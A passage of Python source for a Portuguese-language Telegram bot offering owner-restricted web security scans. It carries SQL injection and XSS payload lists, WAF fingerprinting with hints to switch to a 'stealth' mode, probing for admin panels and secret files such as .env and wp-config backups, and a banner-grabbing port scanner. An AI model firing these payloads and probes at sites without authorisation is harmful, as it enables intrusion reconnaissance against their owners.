    now = time.time()
    # PERF: Cleanup old entries every 5 min to prevent memory leak
    if now - LAST_SEND_TIME_CLEANUP > SEND_TIME_MAX_AGE:
        cutoff = now - SEND_TIME_MAX_AGE
        LAST_SEND_TIME = {k: v for k, v in LAST_SEND_TIME.items() if v > cutoff}
        LAST_SEND_TIME_CLEANUP = now
    last = LAST_SEND_TIME.get(chat_id, 0)
    elapsed = now - last
    if elapsed < SEND_COOLDOWN:
        time.sleep(SEND_COOLDOWN - elapsed)
    LAST_SEND_TIME[chat_id] = time.time()

def send_message(chat_id, text, parse_mode="HTML"):
    """Send message with rate limiting and retry on 429 (uses shared HTTP session)"""
    _rate_limit_wait(chat_id)
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True
        }, timeout=10)
        if resp.status_code == 429:
            # FIX v3.9: Max 3 retries to prevent RecursionError
            retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
            time.sleep(retry_after)
            resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode,
                "disable_web_page_preview": True
            }, timeout=10)
            if resp.status_code == 429:
                retry_after = resp.json().get('parameters', {}).get('retry_after', 5)
                time.sleep(retry_after)
                resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                    "chat_id": chat_id,
                    "text": text,
                    "parse_mode": parse_mode,
                    "disable_web_page_preview": True
                }, timeout=10)
        return resp
    except Exception as e:
        print(f"[Send Error] {e}")
        return None

def check_owner(user_id, chat_id):
    """Check if user is owner. Returns True if owner, sends translated deny message and returns False if not."""
    if user_id in OWNERS:
        return True
    lang = get_user_lang(user_id)
    if lang == 'en':
        send_message_safe(chat_id, "🚫 <b>Access denied!</b> This command is restricted to bot owners.")
    elif lang == 'es':
        send_message_safe(chat_id, "🚫 <b>Acceso denegado!</b> Este comando está restringido a los dueños del bot.")
    else:
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
    return False

def send_msg(user_id, chat_id, text, parse_mode="HTML"):
    """Translation-aware send_message_safe wrapper.
    Auto-translates known strings based on user's language.
    Falls back to original PT text if no translation exists."""
    lang = get_user_lang(user_id)
    if lang != 'pt' and text:
        text = _translate(text, lang)
    return send_message_safe(chat_id, text, parse_mode)

def send_message_safe(chat_id, text, parse_mode="HTML"):
    """Send message with fallback to plain text if HTML fails"""
    try:
        resp = send_message(chat_id, text, parse_mode)
        if resp and resp.status_code == 200:
            return resp
        # FIX v3.9: Only fallback on HTML parse errors (not all 400s)
        # Check if the error is specifically about parse_mode/HTML
        if resp and resp.status_code == 400:
            error_desc = ""
            try:
                error_desc = resp.json().get('description', '').lower()
            except:
                pass
            if 'can\'t parse entities' in error_desc or 'parse_mode' in error_desc or 'unknown entity' in error_desc or 'bad request' in error_desc:
                # This is a real HTML parse error — fallback to plain text
                plain = re.sub(r'<[^>]+>', '', text)
                plain = plain.replace('&lt;', '<').replace('&gt;', '>').replace('&quot;', '"').replace('&#39;', "'").replace('&amp;', '&')
                return send_message(chat_id, plain[:4000], parse_mode=None)
    except Exception as e:
        print(f"[Send Safe Error] {e}")
    return None

def send_document(chat_id, text, filename="report.txt"):
    """Send text as document file. Returns True on success, False on failure."""
    try:
        filepath = os.path.join(DB_DIR, filename)
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(text)
        with open(filepath, "rb") as f:
            resp = HTTP_SESSION.post(f"{API_URL}/sendDocument",
                data={"chat_id": chat_id, "caption": f"📄 {filename}"},
                files={"document": f}, timeout=30)
        if resp and resp.status_code == 200:
            os.remove(filepath)
            return True
        else:
            print(f"[Doc Error] Send failed (status {resp.status_code if resp else 'no response'}), file kept at {filepath}")
            return False
    except Exception as e:
        print(f"[Doc Error] {e}")
        return False

def send_long_message(chat_id, text, prefix=""):
    """Split long messages into chunks respecting Telegram 4096 char limit"""
    MAX = 3900  # Safe limit (Telegram max is 4096)
    chunks = []
    current = prefix
    for line in text.split('\n'):
        # FIX v3.9: If a single line exceeds MAX, split it into pieces
        if len(line) > MAX:
            # Flush current chunk first
            if current.strip():
                chunks.append(current.rstrip())
            # Split the long line into pieces of MAX size
            while len(line) > MAX:
                chunks.append(line[:MAX])
                line = line[MAX:]
            current = line + '\n'
            continue
        if len(current) + len(line) + 1 > MAX:
            if current.strip():
                chunks.append(current.rstrip())
            current = prefix
        current += line + '\n'
    if current.strip():
        chunks.append(current.rstrip())
    for chunk in chunks:
        send_message_safe(chat_id, chunk)

def send_message_with_buttons(chat_id, text, buttons, parse_mode="HTML"):
    """Send message with inline keyboard buttons"""
    _rate_limit_wait(chat_id)
    try:
        # buttons is list of lists: [[{"text": "Rescan", "callback_data": "/rescan sqli url"}, ...]]
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": chat_id,
            "text": text,
            "parse_mode": parse_mode,
            "disable_web_page_preview": True,
            "reply_markup": {"inline_keyboard": buttons}
        }, timeout=10)
        return resp
    except Exception as e:
        print(f"[Send Buttons Error] {e}")
        return None



def edit_menu(chat_id, text, buttons, parse_mode="HTML"):
    """Edit an existing menu message instead of sending a new one.
    Falls back to send_message_with_buttons if no message_id is tracked."""
    # Find user_id for this chat_id
    for uid, mid in MENU_MSG_IDS.items():
        if mid:  # Only edit if we have a message_id
            try:
                resp = HTTP_SESSION.post(f"{API_URL}/editMessageText", json={
                    "chat_id": chat_id,
                    "message_id": mid,
                    "text": text,
                    "parse_mode": parse_mode,
                    "disable_web_page_preview": True,
                    "reply_markup": {"inline_keyboard": buttons}
                }, timeout=10)
                if resp and resp.status_code == 200:
                    return resp
                # If edit fails (e.g., message was deleted), send new
            except:
                pass
            break  # Only try one user's message_id per chat
    # Fallback: send new message
    resp = send_message_with_buttons(chat_id, text, buttons, parse_mode)
    if resp and resp.status_code == 200:
        try:
            mid = resp.json().get('result', {}).get('message_id')
            if mid:
                MENU_MSG_IDS[chat_id] = mid
        except:
            pass
    return resp

def send_feedback_to_channel(user_id, username, first_name, message, channel_type="feedback"):
    """Forward feedback/bug report to the channel and return channel message_id"""
    if channel_type == "feedback":
        emoji = "🔰"
        title = "NOVO FEEDBACK DE AGENTE"
    else:
        emoji = "🐛"
        title = "NOVO BUG REPORTADO"

    channel_msg = f"""━━━━━━━━━━━━━━━━━━━━━━━━
{emoji} 📨 {title}
━━━━━━━━━━━━━━━━━━━━━━━━
│ 👤 Nome: {escape_html(first_name)}
│ 🔗 Username: @{escape_html(username) or 'Sem Username'}
│ 🆔 ID: {user_id}
│ 💬 Mensagem:
│ {escape_html(message[:500])}
━━━━━━━━━━━━━━━━━━━━━━━━

"""
    try:
        resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
            "chat_id": FEEDBACK_CHANNEL,
            "text": channel_msg,
            "parse_mode": "HTML"
        }, timeout=10)
        if resp and resp.status_code == 200:
            data = resp.json().get('result', {})
            return data.get('message_id', 0)
    except Exception as e:
        print(f"[Channel Error] {channel_type}: {e}")
    return 0


def db_cache_get(cmd, target):
    """Get cached result from DB. Returns result text or None."""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT result FROM scan_cache WHERE cmd = ? AND target = ? AND (strftime('%s', 'now') - created_at) < ?",
                      (cmd, target, DB_CACHE_TTL))
            row = c.fetchone()
            if row:
                return row['result']
    except Exception as e:
        print(f"[DB Cache Error] get: {e}")
    return None


def db_cache_set(cmd, target, result):
    """Store result in DB cache"""
    try:
        with sqlite3.connect(DB_PATH) as conn:
            c = conn.cursor()
            c.execute("INSERT OR REPLACE INTO scan_cache (cmd, target, result, created_at) VALUES (?, ?, ?, ?)",
                      (cmd, target, result, time.time()))
            conn.commit()
    except Exception as e:
        print(f"[DB Cache Error] set: {e}")


def escape_html(text):
    """Escape HTML special chars in dynamic content"""
    if text is None:
        return "N/D"
    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")

# ═══════════════════════════════════════════════════════════════
#  OWNER CHECK
# ═══════════════════════════════════════════════════════════════
def is_owner(user_id):
    return user_id in OWNERS

# ═══════════════════════════════════════════════════════════════
#  SECURITY TOOLS v3.6
# ═══════════════════════════════════════════════════════════════

# NOTE: _safe_get_stealth removed (unused dead function)
def _safe_get(url, timeout=5, headers=None):
    """Safe GET request with retry on connection errors (uses shared HTTP session).
    Supports custom headers (needed for DNS-over-HTTPS queries)."""
    for attempt in range(3):
        try:
            return HTTP_SESSION.get(url, timeout=timeout, allow_redirects=True, headers=headers)
        except requests.exceptions.ConnectionError:
            if attempt < 2:
                time.sleep(0.5)
            else:
                return None
        except Exception:
            return None
    return None

def tool_website_info(url):
    """Website Information Gathering - IMPROVED v3.6"""
    results = ""
    try:
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        response = _safe_get(url, timeout=5)
        if not response:
            return "❌ Não foi possível acessar o site"

        soup = BeautifulSoup(response.text, 'html.parser')

        ip = "Error"
        try:
            hostname = urlparse(url).netloc.split(':')[0]
            ip = socket.gethostbyname(hostname)
        except:
            pass

        # Detect technology stack
        tech = []
        headers = response.headers
        if 'x-powered-by' in headers:
            tech.append(headers['x-powered-by'])
        if 'server' in headers:
            tech.append(headers['server'])
        if 'x-generator' in headers:
            tech.append(headers['x-generator'])

        info = {
            'URL': escape_html(url),
            'Status': str(response.status_code),
            'Server': escape_html(response.headers.get('Server', 'N/D')),
            'Content-Type': escape_html(response.headers.get('Content-Type', 'N/D')),
            'X-Powered-By': escape_html(response.headers.get('X-Powered-By', 'N/D')),
            'X-Generator': escape_html(response.headers.get('X-Generator', 'N/D')),
            'IP': escape_html(ip),
            'Title': escape_html(soup.title.string if soup.title and soup.title.string else 'N/D'),
            'Meta Tags': str(len(soup.find_all('meta'))),
            'Links': str(len(soup.find_all('a'))),
            'Images': str(len(soup.find_all('img'))),
            'Scripts': str(len(soup.find_all('script'))),
            'Forms': str(len(soup.find_all('form'))),
            'Tamanho': f"{len(response.content) / 1024:.1f} KB",
        }

        results = "📡 <b>Informações do Site</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        for key, value in info.items():
            results += f"<b>{key}:</b> {value}\n"

        if tech:
            results += f"\n<b>💡 Tecnologias:</b> {', '.join(escape_html(t) for t in tech)}\n"
        results += "━━━━━━━━━━━━━━━━━━━━━━"
    except Exception as e:
        results = f"❌ Erro: {escape_html(str(e))}"
    return results

def tool_sqli(url, verbose=False):
    """SQL Injection Scanner v5.1 - 28 payloads, baseline comparison, ANTI-FALSE-POSITIVE, verbose mode"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    payloads = [
        # Basic tests
        "'", "\"", "1'", "1\"",
        # Boolean-based
        "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR '1'='1'--", "\" OR \"1\"=\"1\"--",
        # Union-based
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION ALL SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        # Order by
        "1' ORDER BY 1--",
        "1' ORDER BY 5--",
        "1' ORDER BY 10--",
        # Additional
        "' OR 'x'='x",
        "' AND 1=1--",
        "' AND 1=2--",
        # Time-based
        "' AND SLEEP(3)--",
        "' WAITFOR DELAY '0:0:3'--",
        "' AND BENCHMARK(10000000,SHA1(1))--",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        # Parenthesis
        "') OR ('1'='1'--",
        "') UNION SELECT NULL--",
        "')) OR (('1'='1'--",
        # Additional time-based
        "' AND SLEEP(5)--",
        "' WAITFOR DELAY '0:0:5'--",
    ]

    error_signs = [
        'sql syntax', 'mysql error', 'mysql_fetch', 'mysql_num_rows',
        'mysql_result', 'postgresql error', 'sqlite error',
        'ora-00933', 'oracle error', 'microsoft sql server',
        'msql', 'microsoft ole db', 'syntax error', 'unterminated',
        'unclosed quotation', 'odbc drivers', 'java.sql.sql',
        'pg_query()', 'sqlite3::query', 'mssql_query',
        'sql injection', 'injection detected', 'sql error'
    ]

    # V5.1: WAF detection patterns
    waf_patterns = {
        'Cloudflare': ['cloudflare', 'cf-ray', 'cloudflare-challenge'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity', 'blocked by mod_security'],
        'Imperva': ['imperva', 'x-iinfo', 'incap_ses'],
        'Barracuda': ['barracuda', 'barra_counter_session'],
        'F5 Big-IP': ['f5-big-ip', 'x-cdn', 'bigipserver'],
        'AWS WAF': ['aws-waf', 'x-amzn-requestid'],
        'DenyAll': ['denyall', 'x-cdn-denied'],
        'Comodo': ['comodo', 'x-cdn-comodo'],
        'Wordfence': ['wordfence', 'wf_ip', 'wf_rules'],
        'Generic WAF': ['forbidden', 'access denied', 'blocked by', 'waf block', 'security check', 'challenge'],
    }

    results = []
    verbose_log = []
    found = 0

    # V5.1: WAF detection on baseline
    detected_waf = []
    baseline_resp = _safe_get(url, timeout=5)
    # FIX v3.7: If site is offline, don't scan
    if not baseline_resp:
        return "❌ Não foi possível acessar o site para análise SQLi"
    baseline_len = len(baseline_resp.content)
    baseline_text = baseline_resp.text.lower()
    baseline_status = baseline_resp.status_code
    baseline_headers_lower = {k.lower(): v.lower() for k, v in baseline_resp.headers.items()}
    # V5.1: Detect WAF
    for waf_name, patterns in waf_patterns.items():
        for p in patterns:
            if p.lower() in baseline_text or any(p.lower() in v for v in baseline_headers_lower.values()):
                detected_waf.append(waf_name)
                break
    if detected_waf:
        verbose_log.append(f"🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf)}")
    verbose_log.append(f"📊 <b>Baseline:</b> Status {baseline_status} | Len: {baseline_len}")

    def check_payload(payload):
        try:
            # FIX: use safe="" to encode quotes and special chars properly
            encoded = requests.utils.quote(payload, safe="")
            test_url = url + encoded
            response = _safe_get(test_url, timeout=5)
            if not response:
                if verbose:
                    verbose_log.append(f"  ❌ Timeout/Erro: <code>{escape_html(payload[:30])}</code>")
                return None
            body = response.text.lower()
            body_len = len(response.content)

            if verbose:
                verbose_log.append(f"  [{response.status_code}] <code>{escape_html(payload[:30])}</code> Len: {body_len}")

            # BASELINE FILTER: If response is identical to baseline, the payload had no effect
            if body_len == baseline_len and abs(len(body) - len(baseline_text)) < 10:
                if verbose:
                    verbose_log.append(f"    ↳ Idêntico ao baseline — descartado")
                return None

            # Check for error signs
            for sign in error_signs:
                if sign in body:
                    # Verify the error isn't in the baseline too (false positive)
                    if sign not in baseline_text:
                        if verbose:
                            verbose_log.append(f"    ⚠️ VULNERÁVEL! Sign: '{escape_html(sign)}'")
                        return payload, True
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL instead of creating new ThreadPoolExecutor
    futures = {SCAN_POOL.submit(check_payload, p): p for p in payloads}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(result[0][:50])}</code>")

    # V5.1: Add WAF bypass suggestions if WAF detected and no vulns found
    waf_section = ""
    if detected_waf and found == 0:
        waf_section = f"\n🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf)}\n"
        waf_section += "💡 <b>Dica:</b> O WAF pode estar bloqueando payloads.\n"
        waf_section += "   Use /stealth sqli <url> para scan mais discreto.\n"

    if found == 0:
        result_text = "✅ Nenhuma vulnerabilidade SQLi detectada"
        if verbose:
            result_text = "✅ Nenhuma vulnerabilidade SQLi detectada\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(verbose_log)
        return result_text + waf_section
    else:
        header = f"🚨 <b>{found} vulnerabilidade(s) SQLi encontrada(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        if verbose:
            return header + "\n".join(results) + "\n━━━━━━━━━━━━━━━━━━━━━━\n\n📋 <b>Log Detalhado:</b>\n" + "\n".join(verbose_log) + waf_section
        return header + "\n".join(results) + waf_section

def tool_xss_scanner(url, verbose=False):
    """XSS Scanner v5.1 - 18 payloads, STRICT unescaped reflection only, ANTI-FALSE-POSITIVE, verbose mode"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    payloads = [
        # Basic script tags
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
        "<a href='javascript:alert(1)'>xss</a>",
        # Event handlers
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<div onmouseover=alert(1)>x</div>',
        "javascript:alert(1)//",
        '<img src="x" onerror="alert(1)">',
        '<svg><script>alert(1)</script></svg>',
        '<iframe src="javascript:alert(1)">',
        '<img src=x srcset="x" onerror=alert(1)>',
        # Angular/Vue/React
        '{{constructor.constructor("alert(1)")()}}',
        "{{_s.constructor('alert(1)')()}}",
        "${alert(1)}",
        '<img src=x onerror="alert(1)//">',
        # V5.1: Polyglot payloads (multi-context XSS)
        "';alert(document.domain)//",
        "\">&lt;img src=x onerror=alert(1)&gt;&lt;",
        "--!&gt;&lt;img src=x onerror=alert(1)&gt;&lt;!",
        "</script><img src=x onerror=alert(1)>",
        "</style><img src=x onerror=alert(1)>",
        "}};alert(document.domain)//",
    ]

    results = []
    verbose_log = []
    found = 0

    # Get baseline: response without any payload
    baseline_resp = _safe_get(url, timeout=5)
    # FIX v3.7: If site is offline, don't scan
    if not baseline_resp:
        return "❌ Não foi possível acessar o site para análise XSS"
    baseline_text = baseline_resp.text
    baseline_len = len(baseline_text)
    baseline_headers_lower = {k.lower(): v.lower() for k, v in baseline_resp.headers.items()}
    # V5.1: WAF detection
    waf_patterns_xss = {
        'Cloudflare': ['cloudflare', 'cf-ray'],
        'Sucuri': ['sucuri', 'x-sucuri'],
        'ModSecurity': ['mod_security', 'modsecurity'],
        'Imperva': ['imperva', 'x-iinfo'],
        'Wordfence': ['wordfence'],
    }
    detected_waf_xss = []
    for waf_name, patterns in waf_patterns_xss.items():
        for p in patterns:
            if p.lower() in baseline_text.lower() or any(p.lower() in v for v in baseline_headers_lower.values()):
                detected_waf_xss.append(waf_name)
                break
    if detected_waf_xss:
        if verbose:
            verbose_log.append(f"🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf_xss)}")
    if verbose:
        verbose_log.append(f"📊 <b>Baseline:</b> Len: {baseline_len}")

    def check_payload(payload):
        try:
            encoded = requests.utils.quote(payload, safe="")
            test_url = url + encoded
            response = _safe_get(test_url, timeout=5)
            if not response:
                if verbose:
                    verbose_log.append(f"  ❌ Timeout: <code>{escape_html(payload[:30])}</code>")
                return None
            body = response.text

            if verbose:
                verbose_log.append(f"  [{response.status_code}] <code>{escape_html(payload[:30])}</code> Len: {len(body)}")

            # BASELINE FILTER: If response is identical to baseline, payload had no effect
            if body == baseline_text:
                if verbose:
                    verbose_log.append(f"    ↳ Idêntico ao baseline — descartado")
                return None

            # FIX: STRICT unescaped reflection check
            # 1. Full payload must appear as-is (unescaped)
            if payload in body:
                if verbose:
                    verbose_log.append(f"    ⚠️ VULNERÁVEL! (reflexão completa)")
                return payload, True

            # 2. Check for escaped version — if ALL versions are escaped, NOT vulnerable
            escaped_payload = html_lib.escape(payload)
            if escaped_payload in body and payload not in body:
                if verbose:
                    verbose_log.append(f"    ↳ Escapado — seguro")
                return None  # Fully escaped = safe

            # 3. Check for partial unescaped reflection of KEY EVENT HANDLERS
            event_handlers = ['onerror=', 'onload=', 'onfocus=', 'onmouseover=', 'ontoggle=', 'onstart=']
            for handler in event_handlers:
                if handler in payload and handler in body:
                    if handler not in baseline_text:
                        idx = body.find(handler)
                        if idx > 0:
                            context_start = max(0, idx - 10)
                            context = body[context_start:idx]
                            if '&lt;' in context:
                                if verbose:
                                    verbose_log.append(f"    ↳ Handler escapado — seguro")
                                continue  # Escaped, skip
                        if verbose:
                            verbose_log.append(f"    ⚠️ VULNERÁVEL! (handler: {escape_html(handler)})")
                        return payload, True
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_payload, p): p for p in payloads}
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            found += 1
            results.append(f"⚠️ <b>XSS Refletido!</b> Payload: <code>{escape_html(result[0][:40])}</code>")

    # V5.1: WAF bypass suggestion
    xss_waf_section = ""
    if detected_waf_xss and found == 0:
        xss_waf_section = f"\n🛡️ <b>WAF Detectada:</b> {', '.join(detected_waf_xss)}\n💡 Use /stealth xss <url> para scan mais discreto.\n"

    if found == 0:
        if verbose:
            return "✅ Nenhuma vulnerabilidade XSS detectada\n━━━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(verbose_log) + xss_waf_section
        return "✅ Nenhuma vulnerabilidade XSS detectada" + xss_waf_section
    else:
        header = f"🚨 <b>{found} vulnerabilidade(s) XSS encontrada(s)!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
        if verbose:
            return header + "\n".join(results) + "\n━━━━━━━━━━━━━━━━━━━━━━\n\n📋 <b>Log Detalhado:</b>\n" + "\n".join(verbose_log) + xss_waf_section
        return header + "\n".join(results) + xss_waf_section

def tool_admin_finder(url, progress_chat_id=None, progress_msg_id=None):
    """Admin Panel Finder v3.6 - 70+ paths, full URL, ANTI-FALSE-POSITIVE, deduped with dir scanner"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    paths = [
        # Standard admin paths (directories)
        'admin/', 'administrator/', 'wp-admin/', 'admincp/',
        'adminpanel/', 'webadmin/', 'admin/', 'admins/',
        'joomla/administrator/', 'cms/administrator/',
        'logins/', 'administration/', 'login/', 'auth/', 'signin/',
        'manager/', 'backend/', 'panel/', 'control/',
        'dashboard/', 'cpanel/', 'myadmin/', 'phpmyadmin/',
        'admin2/', 'admin3/', 'admin4/', 'admin5/', 'admin1/',
        'moderator/', 'moderator/admin/', 'administrator/',
        'controlpanel/', 'cpanel/', 'siteadmin/',
        'sysadmin/', 'instadmin/', 'bb-admin/', 'bbadmin/',
        'member/', 'members/', 'console/', 'settings/',
        'user/login/', 'account/login/', 'site/login/',
        'phpmyadmin/', 'myadmin/',
        # V5.1: More admin paths
        'login/admin/', 'portal/', 'manage/', 'access/',
        'backend/', 'secure/', 'restricted/',
        'webpanel/', 'adminportal/', 'mypanel/',
        'adminarea/', 'adminpanel/', 'siteadmin/',
        'staff/', 'operator/', 'supervisor/',
        'root/', 'sudo/', 'superadmin/',
        'config/', 'setup/', 'install/',
        # Admin files (NO trailing slashes on files)
        'admin.php', 'admin.html', 'admin.asp', 'admin.jsp',
        'admincp.php', 'cp.php', 'admin/index.php', 'admin/index.html',
        'admin/login.php', 'admin/index.asp', 'admin/default.php',
        'admin/login.html', 'admin/account.php', 'admin/account.html',
        'admin1/', 'admin1.php', 'admin1.html',
        'admin1/account.php', 'admin1/login.php',
        'admin2/login.php', 'admin2/index.php',
        'admin3/login.php', 'admin3/index.php',
        'moderator.php', 'moderator/login.php', 'moderator/admin.php',
        'administrator/login.php', 'administrator/index.php',
        'panel.php', 'panel/admin.php', 'panel/login.php',
        'controlpanel.php', 'cpanel.php',
        'webadmin.php', 'siteadmin/login.php', 'siteadmin/index.php',
        'sysadmin/login.php', 'instadmin/login.php',
        'bb-admin/login.php', 'bb-admin/index.php', 'bbadmin/login.php',
        'member/login.php', 'member/admin.php',
        'members/login.php', 'members/admin.php',
        'console/login.php', 'settings/login.php',
        'phpmyadmin/index.php', 'phpmyadmin/login.php',
        'myadmin/index.php', 'myadmin/login.php',
        'wp-login.php', 'admin.php', 'login.php',
        'config.php', 'phpinfo.php',
        '.env', '.htaccess', '.htpasswd',
        'wp-config.php', 'wp-config.php.bak',
        'config/database.yml', 'config/application.php',
        'config.ini', 'settings.ini', 'appsettings.json',
    ]

    # FIX v3.9: Deduplicate paths using set()
    paths = list(dict.fromkeys(paths))  # Preserves order, removes duplicates
    base_url = url.rstrip('/')
    results = []
    found = 0
    total = len(paths)

    # Get baseline: a random path that definitely doesn't exist
    baseline = _safe_get(f"{base_url}/{random_string(12)}.xyz", timeout=3)
    baseline_status = baseline.status_code if baseline else 404
    baseline_len = len(baseline.content) if baseline else 0

    # Get root page content for comparison
    root = _safe_get(base_url, timeout=3)
    root_len = len(root.content) if root else 0

    # V5.1: Thread-safe counter
    import threading as _threading
    _progress_lock = _threading.Lock()
    checked_count = [0]  # Use list for mutability across threads

    def check_path(path):
        with _progress_lock:
            checked_count[0] += 1
            current = checked_count[0]
        # Report progress every 10 paths
        if current % 10 == 0 and progress_chat_id and progress_msg_id:
            try:
                edit_progress(progress_msg_id, progress_chat_id, current, total, "Escaneando paths...")
            except:
                pass
        try:
            full_path = f"{base_url}/{path}"
            r = _safe_get(full_path, timeout=3)
            if not r:
                return None
            body = r.text
            body_len = len(r.content)

            # FILTER 1: Body too small (< 50 chars) = generic error page
            if body_len < 50:
                return None

            # FILTER 2: Status 404 = definitely not found
            if r.status_code == 404:
                return None

            # FILTER 3: Body is identical to root page = catch-all / SPA route
            if r.status_code == 200 and body_len == root_len and root_len > 0:
                return None

            # FILTER 4: Body is identical to baseline (wildcard 403/404 page)
            if body_len == baseline_len and baseline_len > 0 and body_len > 0:
                if abs(len(body) - len(baseline.text)) < 10:
                    return None

            # FILTER 5: Check for common error page content
            error_phrases = [
                'does not exist', 'not found', 'page not found',
                '404 error', 'the requested url', 'resource not found',
                'not found on this server', 'no such file',
                'doesnt exist', 'page does not',
            ]
            body_lower = body.lower()
            for phrase in error_phrases:
                if phrase in body_lower:
                    return None

            # FILTER 6: 403 must have a real login form or admin content
            if r.status_code in [403, 401]:
                admin_indicators = [
                    'login', 'password', 'username', 'sign in',
                    'admin', 'dashboard', 'panel', 'access denied',
                    'forbidden', 'login form', 'authentication',
                    'wp-login', 'administrator', 'phpmyadmin',
                ]
                if not any(indicator in body_lower for indicator in admin_indicators):
                    known_admin = ['admin', 'administrator', 'wp-admin', 'phpmyadmin', 'myadmin', 'panel', 'backend', 'cpanel', 'phpinfo']
                    if not any(k in path for k in known_admin):
                        return None

            return (full_path, r.status_code)
        except:
            pass
        return None

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(check_path, p): p for p in paths}
    completed = 0
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        completed += 1
        if result:
            found += 1
            emoji = "🔓" if result[1] == 200 else "🚫"
            results.append(f"{emoji} <b>/{escape_html(result[0].split(base_url + '/', 1)[-1])}</b> (Status: {result[1]})")
        # Update progress
        if completed % 10 == 0 and progress_chat_id and progress_msg_id:
            try:
                edit_progress(progress_msg_id, progress_chat_id, completed, total, "Escaneando paths...")
            except:
                pass

    if found == 0:
        return f"🔍 <b>Painel Admin</b> — {escape_html(base_url)}\n━━━━━━━━━━━━━━━━━━━━━━\n\n✅ Nenhum painel admin encontrado"
    else:
        # V5.1: Better formatted results with emojis
        header = f"🔍 <b>Painel Admin</b> — {escape_html(base_url)}\n━━━━━━━━━━━━━━━━━━━━━━\n\n🚨 <b>{found} painel(is) encontrado(s)!</b>\n"
        formatted = []
        for r in results:
            formatted.append(r)
        return header + "\n".join(formatted)

def tool_port_scanner(target):
    """Port Scanner v3.6 - 26 portas"""
    # Extract clean hostname from URL if needed
    hostname = extract_hostname(target)
    try:
        target_ip = socket.gethostbyname(hostname)
    except:
        return f"❌ Domínio/IP inválido: {escape_html(hostname)}"

    ports = {
        21: "FTP", 22: "SSH", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 993: "IMAPS",
        995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
        3000: "Node", 3306: "MySQL", 3389: "RDP",
        4000: "Dev", 5000: "Docker", 5432: "PostgreSQL",
        5900: "VNC", 6379: "Redis", 8000: "HTTP-Alt2",
        8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "Alt3",
        9090: "Grafana", 9200: "Elasticsearch",
        11211: "Memcached", 27017: "MongoDB",
    }

    results = f"🔍 <b>Scan de Portas</b> — {escape_html(hostname)} ({escape_html(target_ip)})\n━━━━━━━━━━━━━━━━━━━━━━\n"
    found = 0

    def grab_banner(port, timeout=2):
        """V5.1: Grab service banner for version detection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            sock.connect((target_ip, port))
            # For HTTP/HTTPS, send a minimal request
            if port in (80, 8080, 8000, 8443, 443, 9090, 9200, 3000, 4000, 5000):
                sock.sendall(b"GET / HTTP/1.0\r\nHost: " + hostname.encode() + b"\r\n\r\n")
            else:
                # For other services, just wait for banner
                pass
            data = b""
            try:
                data = sock.recv(512)
            except:
                pass
            sock.close()
            if data:
                banner = data.decode('utf-8', errors='replace').strip()
                # Extract just the server header line
                for line in banner.split('\n'):
                    if line.lower().startswith('server:'):
                        return line[7:].strip()
                    if 'HTTP/' in line and 'Server' in banner:
                        continue
                # Return first line if it looks like a banner
                first_line = banner.split('\n')[0].strip()
                if first_line and len(first_line) < 100:
                    return first_line
            return ""
        except:
            return ""

    def scan_port(port):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                # V5.1: Grab banner for version detection
                banner = grab_banner(port)
                return port, True, banner
            return port, False, ""
        except:
            return port, False, ""
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

    # PERF: Use shared SCAN_POOL
    futures = {SCAN_POOL.submit(scan_port, p): p for p in ports}
    for future in concurrent.futures.as_completed(futures):
        port, is_open, banner = future.result()
        if is_open:
            found += 1
